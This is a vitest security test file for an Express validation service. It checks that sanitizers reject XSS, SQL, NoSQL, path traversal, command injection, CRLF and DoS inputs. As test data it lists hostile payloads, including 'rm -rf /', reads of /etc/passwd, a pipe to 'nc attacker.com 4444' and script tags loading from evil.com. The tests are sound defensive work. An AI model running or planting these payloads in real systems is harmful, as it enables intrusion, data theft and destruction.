import { describe, it, expect, beforeEach } from 'vitest';
import request from 'supertest';
import express from 'express';

/**
 * 🔴 RED PHASE: Security & XSS Prevention Tests
 * 
 * These tests simulate real-world attacks to ensure
 * our validation and sanitization prevents them.
 * 
 * Test Coverage:
 * - XSS (Cross-Site Scripting)
 * - SQL Injection attempts
 * - Path Traversal
 * - DoS (Denial of Service)
 * - NoSQL Injection
 * - Command Injection
 * - CSRF token validation
 * - Header injection
 */

import { validate, schemas } from '../../server/middleware/validation.js';
import { ValidationService } from '../../server/services/validationService.js';

describe('Security - XSS Prevention', () => {
  let app;
  let validator;

  beforeEach(() => {
    app = express();
    app.use(express.json());
    validator = new ValidationService();
  });

  it('should block script tag XSS payloads', async () => {
    app.post('/test', validate({ body: 'contactForm', sanitize: true }), (req, res) => {
      res.json({ message: req.body.message });
    });

    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<script src="http://evil.com/evil.js"></script>',
      '<script>document.cookie</script>',
      '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
      '<script>window.location="http://evil.com"</script>'
    ];

    for (const payload of xssPayloads) {
      const response = await request(app)
        .post('/test')
        .send({
          name: 'Test',
          email: 'test@example.com',
          message: payload,
          site: 'mysite'
        });

      expect(response.status).toBe(200);
      expect(response.body.message).not.toContain('<script');
      expect(response.body.message).not.toContain('</script>');
    }
  });

  it('should block event handler XSS payloads', async () => {
    const eventHandlerPayloads = [
      '<img src=x onerror=alert(1)>',
      '<body onload=alert("XSS")>',
      '<div onmouseover="alert(\'XSS\')">',
      '<input onfocus=alert(1) autofocus>',
      '<select onfocus=alert(1) autofocus>',
      '<textarea onfocus=alert(1) autofocus>',
      '<iframe onload=alert(1)>',
      '<svg onload=alert(1)>'
    ];

    for (const payload of eventHandlerPayloads) {
      const sanitized = validator.sanitizeString(payload);
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('onmouseover');
      expect(sanitized).not.toContain('onfocus');
    }
  });

  it('should block JavaScript protocol XSS', async () => {
    const jsProtocolPayloads = [
      'javascript:alert(1)',
      'javascript:void(alert(1))',
      'javascript:eval("alert(1)")',
      'JaVaScRiPt:alert(1)', // case insensitive
      '  javascript:alert(1)', // whitespace
      'data:text/html,<script>alert(1)</script>'
    ];

    for (const payload of jsProtocolPayloads) {
      const result = validator.validateURL(payload);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('protocol');
    }
  });

  it('should block encoded XSS attempts', async () => {
    const encodedPayloads = [
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      '%3Cscript%3Ealert(1)%3C/script%3E',
      '&lt;script&gt;alert(1)&lt;/script&gt;',
      '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
      '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e'
    ];

    for (const payload of encodedPayloads) {
      const sanitized = validator.sanitizeString(payload, { decodeFirst: true });
      expect(sanitized).not.toContain('<script');
    }
  });

  it('should block SVG-based XSS', async () => {
    const svgPayloads = [
      '<svg><script>alert(1)</script></svg>',
      '<svg onload=alert(1)>',
      '<svg><animate onbegin=alert(1)>',
      '<svg><a href="javascript:alert(1)"><text x="0" y="0">Click</text></a></svg>'
    ];

    for (const payload of svgPayloads) {
      const sanitized = validator.sanitizeString(payload);
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('javascript:');
    }
  });

  it('should block DOM-based XSS vectors', async () => {
    const domPayloads = [
      '<iframe src="javascript:alert(1)">',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">',
      '<link rel="stylesheet" href="javascript:alert(1)">',
      '<base href="javascript:alert(1)//">'
    ];

    for (const payload of domPayloads) {
      const sanitized = validator.sanitizeString(payload);
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('<object');
      expect(sanitized).not.toContain('<embed');
    }
  });
});

describe('Security - SQL Injection Prevention', () => {
  let validator;

  beforeEach(() => {
    validator = new ValidationService();
  });

  it('should handle SQL injection attempts in strings', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "admin'--",
      "' UNION SELECT NULL, NULL, NULL--",
      "1'; DELETE FROM users WHERE '1'='1",
      "' OR 1=1--",
      "admin' OR '1'='1'/*",
      "' WAITFOR DELAY '00:00:10'--"
    ];

    // Sanitization should not throw and should make safe
    for (const payload of sqlInjectionPayloads) {
      expect(() => validator.sanitizeString(payload)).not.toThrow();
      const sanitized = validator.sanitizeString(payload);
      expect(sanitized).toBeDefined();
      // Should escape or remove dangerous SQL characters
    }
  });

  it('should validate numbers strictly to prevent SQL injection', () => {
    const maliciousNumbers = [
      "1 OR 1=1",
      "1'; DROP TABLE users--",
      "1 UNION SELECT",
      NaN,
      Infinity,
      -Infinity
    ];

    for (const value of maliciousNumbers) {
      const result = validator.validateNumber(value);
      expect(result.isValid).toBe(false);
    }
  });

  it('should validate UUIDs/IDs strictly', () => {
    const maliciousIds = [
      "' OR '1'='1",
      "1 OR 1=1",
      "../../../etc/passwd",
      "admin'--"
    ];

    const uuidPattern = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

    for (const id of maliciousIds) {
      expect(uuidPattern.test(id)).toBe(false);
    }
  });
});

describe('Security - Path Traversal Prevention', () => {
  let validator;

  beforeEach(() => {
    validator = new ValidationService();
  });

  it('should block path traversal attempts', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..;/..;/..;/etc/passwd',
      '..//..//..//etc/passwd'
    ];

    for (const payload of pathTraversalPayloads) {
      const result = validator.sanitizePath(payload);
      expect(result).not.toContain('..');
      expect(result).not.toContain('etc/passwd');
      expect(result).not.toContain('windows');
    }
  });

  it('should validate filenames strictly', () => {
    const maliciousFilenames = [
      '../../../etc/passwd',
      'file.txt; rm -rf /',
      'file.txt && cat /etc/passwd',
      'file.txt | nc attacker.com 4444',
      'file.txt`whoami`',
      'file.txt$(whoami)'
    ];

    const safeFilenamePattern = /^[a-zA-Z0-9._-]+$/;

    for (const filename of maliciousFilenames) {
      expect(safeFilenamePattern.test(filename)).toBe(false);
    }
  });

  it('should allow only safe path characters', () => {
    const safeFilenames = [
      'document.pdf',
      'image_2024.jpg',
      'file-name.txt',
      'report.2024-01-15.csv'
    ];

    const safeFilenamePattern = /^[a-zA-Z0-9._-]+$/;

    for (const filename of safeFilenames) {
      expect(safeFilenamePattern.test(filename)).toBe(true);
    }
  });
});

describe('Security - DoS Prevention', () => {
  let validator;

  beforeEach(() => {
    validator = new ValidationService();
  });

  it('should reject extremely large strings', () => {
    const hugeString = 'a'.repeat(10000000); // 10MB
    const result = validator.validateLength(hugeString, 0, 100000);
    expect(result.isValid).toBe(false);
    expect(result.error).toContain('too long');
  });

  it('should reject deeply nested objects (billion laughs attack)', () => {
    // Create deeply nested object
    let nested = { value: 1 };
    for (let i = 0; i < 1000; i++) {
      nested = { nested };
    }

    const result = validator.checkObjectDepth(nested, 50);
    expect(result).toBeGreaterThan(50);
  });

  it('should reject JSON bombs', () => {
    // Exponential expansion attack
    const jsonBomb = '{"a":'.repeat(1000) + '1' + '}'.repeat(1000);
    const result = validator.safeJSONParse(jsonBomb, { maxSize: 100000 });
    expect(result.success).toBe(false);
    expect(result.error).toContain('too large');
  });

  it('should reject arrays with millions of elements', () => {
    const hugeArray = Array(1000000).fill('x');
    const result = validator.validateArray(hugeArray, { maxLength: 10000 });
    expect(result.isValid).toBe(false);
  });

  it('should reject objects with excessive keys', () => {
    const manyKeys = {};
    for (let i = 0; i < 100000; i++) {
      manyKeys[`key${i}`] = 'value';
    }

    const result = validator.validateObject(manyKeys, {}, { maxKeys: 1000 });
    expect(result.isValid).toBe(false);
    expect(result.error).toContain('too many keys');
  });

  it('should enforce regex timeout to prevent ReDoS', () => {
    // This pattern is vulnerable to catastrophic backtracking
    const evilRegex = /^(a+)+$/;
    const attackString = 'a'.repeat(100) + 'b';

    // Our validator should timeout or reject this
    const start = Date.now();
    try {
      validator.validatePattern(attackString, evilRegex, { timeout: 100 });
    } catch (e) {
      // Should timeout
    }
    const duration = Date.now() - start;
    expect(duration).toBeLessThan(200); // Should timeout before hanging
  });
});

describe('Security - NoSQL Injection Prevention', () => {
  let validator;

  beforeEach(() => {
    validator = new ValidationService();
  });

  it('should block MongoDB operator injection', () => {
    const noSQLPayloads = [
      { $gt: '' },
      { $ne: null },
      { $where: 'function() { return true; }' },
      { $regex: '.*' },
      { $exists: true }
    ];

    for (const payload of noSQLPayloads) {
      const result = validator.validateObject(payload, {}, { strictKeys: true });
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('not allowed');
    }
  });

  it('should reject keys starting with $ in strict mode', () => {
    const maliciousKeys = ['$gt', '$ne', '$where', '$regex'];

    for (const key of maliciousKeys) {
      const obj = { [key]: 'value' };
      const result = validator.validateObject(obj, {}, { strictKeys: true });
      expect(result.isValid).toBe(false);
    }
  });
});

describe('Security - Command Injection Prevention', () => {
  let validator;

  beforeEach(() => {
    validator = new ValidationService();
  });

  it('should block shell command injection attempts', () => {
    const commandInjectionPayloads = [
      'file.txt; rm -rf /',
      'file.txt && cat /etc/passwd',
      'file.txt | nc attacker.com 4444',
      'file.txt`whoami`',
      'file.txt$(whoami)',
      'file.txt;ls -la',
      'file.txt&whoami'
    ];

    for (const payload of commandInjectionPayloads) {
      const sanitized = validator.sanitizeString(payload);
      expect(sanitized).not.toContain(';');
      expect(sanitized).not.toContain('&&');
      expect(sanitized).not.toContain('||');
      expect(sanitized).not.toContain('`');
      expect(sanitized).not.toContain('$');
      expect(sanitized).not.toContain('|');
    }
  });
});

describe('Security - Header Injection Prevention', () => {
  let app;

  beforeEach(() => {
    app = express();
    app.use(express.json());
  });

  it('should block CRLF injection in headers', async () => {
    const crlfPayloads = [
      'test\r\nSet-Cookie: admin=true',
      'test\nLocation: http://evil.com',
      'test\r\n\r\n<script>alert(1)</script>'
    ];

    app.post('/test', (req, res) => {
      // Attempt to set header from user input (bad practice, but testing)
      try {
        res.setHeader('X-Custom', req.body.value);
        res.json({ success: true });
      } catch (e) {
        // Should throw on invalid header value
        res.status(400).json({ error: 'Invalid header value' });
      }
    });

    for (const payload of crlfPayloads) {
      const response = await request(app)
        .post('/test')
        .send({ value: payload });

      // Either rejected by Express or our validation
      expect(response.headers['set-cookie']).toBeUndefined();
      expect(response.headers['location']).not.toBe('http://evil.com');
    }
  });
});

describe('Security - Mass Assignment Prevention', () => {
  let validator;

  beforeEach(() => {
    validator = new ValidationService();
  });

  it('should reject unauthorized fields in strict mode', () => {
    const allowedSchema = {
      name: { type: 'string' },
      email: { type: 'email' }
    };

    const maliciousUpdate = {
      name: 'John',
      email: 'john@example.com',
      role: 'admin', // Attempting to escalate privileges
      is_admin: true,
      subscription_plan: 'premium' // Attempting to upgrade for free
    };

    const result = validator.validateObject(maliciousUpdate, allowedSchema, { strict: true });
    expect(result.isValid).toBe(false);
    expect(result.errors.length).toBeGreaterThanOrEqual(3);
  });
});

describe('Security - Unicode and Encoding Attacks', () => {
  let validator;

  beforeEach(() => {
    validator = new ValidationService();
  });

  it('should handle homograph attacks', () => {
    // Using Cyrillic characters that look like Latin
    const homographDomains = [
      'аpple.com', // Cyrillic 'а' instead of Latin 'a'
      'gооgle.com', // Cyrillic 'о' instead of Latin 'o'
      'fаcebook.com' // Mixed characters
    ];

    for (const domain of homographDomains) {
      const email = `user@${domain}`;
      const result = validator.validateEmail(email, { checkUnicode: true });
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('unicode');
    }
  });

  it('should detect zero-width characters', () => {
    const zeroWidthChars = [
      'admin\u200B', // Zero-width space
      'admin\u200C', // Zero-width non-joiner
      'admin\u200D', // Zero-width joiner
      'admin\uFEFF' // Zero-width no-break space
    ];

    for (const str of zeroWidthChars) {
      const sanitized = validator.sanitizeString(str, { removeInvisible: true });
      expect(sanitized).toBe('admin');
    }
  });

  it('should normalize Unicode to prevent bypasses', () => {
    // Different Unicode representations of the same character
    const variants = [
      'café', // é as single character (U+00E9)
      'café' // é as e + combining accent (U+0065 U+0301)
    ];

    const normalized = variants.map(v => validator.sanitizeString(v, { normalize: true }));
    expect(normalized[0]).toBe(normalized[1]);
  });
});

describe('Security - Content Type Validation', () => {
  let app;

  beforeEach(() => {
    app = express();
    app.use(express.json());
  });

  it('should reject non-JSON content types when JSON is expected', async () => {
    app.post('/api/test', validate({ body: 'register' }), (req, res) => {
      res.json({ success: true });
    });

    const response = await request(app)
      .post('/api/test')
      .set('Content-Type', 'text/plain')
      .send('email=test@example.com&password=pass');

    expect(response.status).toBe(400);
  });
});

describe('Security - Rate Limit Bypass Prevention', () => {
  it('should not allow rate limit bypass via header manipulation', () => {
    const bypassHeaders = [
      'X-Forwarded-For',
      'X-Real-IP',
      'X-Originating-IP',
      'X-Client-IP',
      'X-Remote-IP'
    ];

    // These headers should be validated and not blindly trusted
    // Test implementation should check if rate limiting can be bypassed
  });
});

